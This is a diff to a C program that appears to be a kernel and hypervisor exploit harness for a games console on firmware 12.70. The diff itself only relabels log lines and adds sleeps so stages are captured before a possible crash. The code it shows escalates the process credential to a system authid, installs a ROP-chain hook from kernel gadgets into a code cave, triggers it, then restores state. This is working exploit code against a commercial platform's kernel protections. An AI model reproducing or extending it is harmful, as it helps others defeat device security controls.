@@ -58,7 +58,7 @@ int main(void)
   if ((fw & 0xffff0000U) != FW_1270 || soc != SOC_PHAT ||
       (dmap >> 48) != 0xffffU || (dmap & 0x3fffffffU) != 0 ||
       dmap > UINT64_MAX - 0x6284b434ULL) {
-    klog("KVC1270,1,stop,stage=platform,fw=0x%08x,soc=0x%x,dmap=0x%016" PRIx64 "\n",
+    klog("KVC1270,2,stop,stage=platform,fw=0x%08x,soc=0x%x,dmap=0x%016" PRIx64 "\n",
          fw, soc, dmap);
     return 2;
   }
@@ -76,7 +76,7 @@ int main(void)
                    sizeof(command_handler)) ||
       !match_bytes(dmap + 0x62842090ULL, register_helper,
                    sizeof(register_helper))) {
-    klog("KVC1270,1,stop,stage=hv-command-guard\n");
+    klog("KVC1270,2,stop,stage=hv-command-guard\n");
     return 2;
   }
 
@@ -104,7 +104,7 @@ int main(void)
       read_qword(entry, &target) != 0 ||
       read_qword(ps4_entry, &ps4_target) != 0 || ps4_target != target ||
       target < ktext(0) || target >= ktext(KH_KIMG_MAX)) {
-    klog("KVC1270,1,stop,stage=preflight,state=0x%016" PRIx64
+    klog("KVC1270,2,stop,stage=preflight,state=0x%016" PRIx64
          ",marker=0x%016" PRIx64 ",return=0x%016" PRIx64 ",target=0x%016" PRIx64
          ",ps4_target=0x%016" PRIx64 "\n",
          state, marker_before, return_before, target, ps4_target);
@@ -114,7 +114,7 @@ int main(void)
   uint64_t authid = kernel_get_ucred_authid(getpid());
   if (kernel_set_ucred_authid(getpid(), SYSTEM_AUTHID) != 0 ||
       pin_to_core(HOOK_CORE) != 0) {
-    klog("KVC1270,1,stop,stage=authid-or-affinity\n");
+    klog("KVC1270,2,stop,stage=authid-or-affinity\n");
     kernel_set_ucred_authid(getpid(), authid);
     return 4;
   }
@@ -125,7 +125,7 @@ int main(void)
                       PCPU_ARRAY_OFFSET + HOOK_CORE * PCPU_STRIDE;
   if (!thread || read_qword(pcpu_row, &row_thread) != 0 ||
       row_thread != (uint64_t)thread) {
-    klog("KVC1270,1,stop,stage=thread-row,thread=0x%016" PRIx64
+    klog("KVC1270,2,stop,stage=thread-row,thread=0x%016" PRIx64
          ",row=0x%016" PRIx64 "\n", (uint64_t)thread, row_thread);
     kernel_set_ucred_authid(getpid(), authid);
     return 5;
@@ -133,7 +133,7 @@ int main(void)
 
   if (kread(cave, saved_head, sizeof(saved_head)) != 0 ||
       kread(cave + KH_OFF_BIG_CHAIN, saved_big, sizeof(saved_big)) != 0) {
-    klog("KVC1270,1,stop,stage=backup\n");
+    klog("KVC1270,2,stop,stage=backup\n");
     kernel_set_ucred_authid(getpid(), authid);
     return 6;
   }
@@ -141,7 +141,7 @@ int main(void)
   khook_t hook;
   int result = kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
   if (result != 0) {
-    klog("KVC1270,1,stop,stage=kh-init,result=%d\n", result);
+    klog("KVC1270,2,stop,stage=kh-init,result=%d\n", result);
     kernel_set_ucred_authid(getpid(), authid);
     return 7;
   }
@@ -153,7 +153,7 @@ int main(void)
   hook.oneshot = 1;
 
   int uid_before = getuid();
-  klog("KVC1270,1,start,fw=0x%08x,target=0x%016" PRIx64
+  klog("KVC1270,2,start,fw=0x%08x,target=0x%016" PRIx64
        ",target_offset=0x%016" PRIx64 ",uid_before=%d\n",
        fw, target, target - ktext(0), uid_before);
   uint8_t handler_buf[10 * sizeof(uint64_t)] = {0};
@@ -170,12 +170,16 @@ int main(void)
   kh_chain_q(&handler, RETURN_MARKER);
   kh_chain_g(&handler, KERNEL_GADGET_ST_RCX_RAX);
   if (handler.err) {
+    klog("KVC1270,2,stop,stage=handler-build\n");
     kernel_set_ucred_authid(getpid(), authid);
     return 8;
   }
+  klog("KVC1270,2,before-install,handler_len=%zu\n", handler.len);
+  // Give klogsrv time to capture each stage before a possible hard shutdown.
+  sleep(1);
   result = kh_install(&hook, &handler);
   if (result != 0) {
-    klog("KVC1270,1,stop,stage=kh-install,result=%d\n", result);
+    klog("KVC1270,2,stop,stage=kh-install,result=%d\n", result);
     kernel_set_ucred_authid(getpid(), authid);
     return 8;
   }
@@ -190,8 +194,9 @@ int main(void)
                     marker_chain[3] == SECOND_MARKER &&
                     marker_chain[4] == kgadget(KERNEL_GADGET_ST_RCX_RAX) &&
                     memcmp(&marker_chain[5], handler_buf, sizeof(handler_buf)) == 0;
-  klog("KVC1270,1,installed,chain_read=%d,chain_match=%d\n",
+  klog("KVC1270,2,installed,chain_read=%d,chain_match=%d\n",
        chain_read, chain_match);
+  sleep(1);
   if (!chain_match)
     result = 9;
 
@@ -201,24 +206,26 @@ int main(void)
   int uid_after = -1;
   int disarm = 0;
   if (result == 0) {
-    klog("KVC1270,1,before-trigger\n");
+    klog("KVC1270,2,before-trigger\n");
+    sleep(1);
     result = kh_trigger(&hook);
     if (result == 0) {
-      klog("KVC1270,1,after-trigger\n");
-      klog("KVC1270,1,before-getuid\n");
+      klog("KVC1270,2,after-trigger\n");
+      klog("KVC1270,2,before-getuid\n");
+      sleep(1);
       uid_after = getuid();
       marker_read = read_qword(cave + KH_OFF_USER, &marker_after);
       return_read = read_qword(cave + KH_OFF_USER + 8, &return_after);
-      klog("KVC1270,1,after-getuid,uid=%d,marker_read=%d,"
+      klog("KVC1270,2,after-getuid,uid=%d,marker_read=%d,"
            "marker=0x%016" PRIx64 ",return_read=%d,return=0x%016" PRIx64 "\n",
            uid_after, marker_read, marker_after, return_read, return_after);
     }
     if (result != 0 || marker_read != 0 || marker_after != SECOND_MARKER ||
         return_read != 0 || return_after != RETURN_MARKER) {
       disarm = kh_disarm(&hook);
-      klog("KVC1270,1,disarm,result=%d\n", disarm);
+      klog("KVC1270,2,disarm,result=%d\n", disarm);
       if (disarm != 0) {
-        klog("KVC1270,1,stop,stage=disarm-failed,hook-left-installed\n");
+        klog("KVC1270,2,stop,stage=disarm-failed,hook-left-installed\n");
         kernel_set_ucred_authid(getpid(), authid);
         return 12;
       }
@@ -227,7 +234,7 @@ int main(void)
 #endif
 
   int hook_restore = kh_restore(&hook);
-  klog("KVC1270,1,restore,hook=%d\n", hook_restore);
+  klog("KVC1270,2,restore,hook=%d\n", hook_restore);
   if (hook_restore != 0) {
     kernel_set_ucred_authid(getpid(), authid);
     return 10;
@@ -239,14 +246,14 @@ int main(void)
 #ifdef KERNEL_VMMCALL_PREP_ONLY_1270
   int ok = result == 0 && head_restore == 0 && big_restore == 0 &&
            auth_restore == 0;
-  klog("KVC1270,1,end,%s,prepare_only=1,head=%d,big=%d,auth=%d\n",
+  klog("KVC1270,2,end,%s,prepare_only=1,head=%d,big=%d,auth=%d\n",
        ok ? "ok" : "fail", head_restore, big_restore, auth_restore);
 #else
   int ok = result == 0 && uid_after == uid_before && marker_read == 0 &&
            marker_after == SECOND_MARKER && return_read == 0 &&
            return_after == RETURN_MARKER && disarm == 0 &&
            head_restore == 0 && big_restore == 0 && auth_restore == 0;
-  klog("KVC1270,1,end,%s,trigger=1,head=%d,big=%d,auth=%d\n",
+  klog("KVC1270,2,end,%s,trigger=1,head=%d,big=%d,auth=%d\n",
        ok ? "ok" : "fail", head_restore, big_restore, auth_restore);
 #endif
   return ok ? 0 : 11;
